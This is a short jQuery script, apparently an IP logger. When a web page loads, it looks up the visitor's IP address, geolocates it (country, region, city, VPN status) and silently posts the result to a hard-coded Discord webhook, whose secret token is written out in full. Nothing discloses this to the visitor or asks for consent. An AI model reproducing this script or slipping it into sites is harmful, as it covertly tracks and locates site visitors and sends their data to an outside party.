$(document).ready(function () {
    $.get("https://api.ipify.org?format=json", function (data) {
        $.get("https://ipinfo.io/" + data.ip + "/json", function (ipData) {
            var message = 'IP Address: ' + data.ip + '\n'
                         + 'Country: ' + ipData.country + '\n'
                         + 'Region: ' + ipData.region + '\n'
                         + 'City: ' + ipData.city + '\n'
                         + 'VPN: ' + (ipData.usingVPN === true ? 'Detected' : 'Not Detected');

            $.ajax({
                url:  "https://discord.com/api/webhooks/1360039579679199342/OAIWZPUU6Yi9rOG3hiHP4nUL3qJNPgdWd7WNZzgi3zPk6kZwJVn55IdKAo3iduGFcIHk",
                type: 'POST',
                data: JSON.stringify({ content: message }),
                contentType: 'application/json'
            });
        });
    });
});
